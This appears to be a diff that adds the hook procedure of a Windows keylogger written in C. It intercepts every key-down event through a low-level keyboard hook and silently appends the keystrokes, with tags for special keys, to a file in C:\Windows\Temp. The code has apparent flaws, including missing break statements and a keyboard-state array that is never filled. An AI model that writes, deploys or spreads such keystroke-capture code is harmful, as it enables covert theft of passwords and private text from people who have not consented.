@@ -1,0 +1,112 @@
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
+    
+    WORD cbuff[2] = {0};
+    BYTE boardstate[256];
+
+    // set file pointer
+    FILE *fpointer;
+    
+    // open file
+    fpointer = fopen("C:\\Windows\\Temp\\test.txt", "a");
+    
+    // error handling
+    if (fpointer == NULL){
+        // in case of failure, call next hook
+        return CallNextHookEx(hHook, nCode, wParam, lParam);
+        
+    }
+
+    KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *) lParam; 
+    
+    // Only record on down press
+    if(wParam == WM_KEYDOWN){
+        switch (key->vkCode){
+        case 0x08:
+            fprintf(fpointer, "[b]");
+            break;
+        case 0x09:
+            fprintf(fpointer, "[t]");
+            break;
+        case 0x0D:
+            fprintf(fpointer, "\n");
+            break;
+        case 0xA0:
+            fprintf(fpointer, "[s]");
+            break;
+        case 0xA1:
+            fprintf(fpointer, "[s]");
+        case 0xA2:
+            fprintf(fpointer, "[ct]");
+            break;
+        case 0xA3:
+            fprintf(fpointer, "[ct]");
+            break;
+        case 0x12:
+            fprintf(fpointer, "[a]");
+            break;
+        case 0x14:
+            fprintf(fpointer, "[c]");
+            break;
+        case 0x20:
+            fprintf(fpointer, " ");
+            break;
+        case 0x2E:
+            fprintf(fpointer, "[d]");
+            break;
+        case 0x25:
+            fprintf(fpointer, "[L]");
+            break;
+        case 0x26:
+            fprintf(fpointer, "[U]");
+            break;
+        case 0x27:
+            fprintf(fpointer, "[R]");
+            break;
+        case 0x28:
+            fprintf(fpointer, "[D]");
+            break;
+        case 0x5B:
+            fprintf(fpointer, "[Win]");
+            break;    
+        case 0x5C:
+            fprintf(fpointer, "[Win]");
+            break;    
+        case 0x5D:
+            fprintf(fpointer, "[Apps]");
+            break;
+        default: 
+            if(ToAscii((UINT)key->vkCode, key->scanCode, boardstate, cbuff, 0) == 1){
+                // print whatever is in the buffer
+                fprintf(fpointer, "%ws", cbuff); 
+            }
+            else{
+                fprintf(fpointer, "[Error]");
+            }
+        }
+    }
+    // to let me know when special keys have been released 
+    if(wParam == WM_KEYUP){
+        switch (key->vkCode){
+        case 0xA0:
+            fprintf(fpointer, "[/s]");
+            break;
+        case 0xA1:
+            fprintf(fpointer, "[/s]");
+        case 0xA2:
+            fprintf(fpointer, "[/ct]");
+            break;
+        case 0xA3:
+            fprintf(fpointer, "[/ct]");
+            break;
+        case 0x12:
+            fprintf(fpointer, "[/a]");
+            break;
+        default: break;
+        }
+    }
+    // close the file pointer
+    fclose(fpointer);
+    
+    // By definition, you have to return CallNextHookEx
+    return CallNextHookEx(hHook, nCode, wParam, lParam);
+}
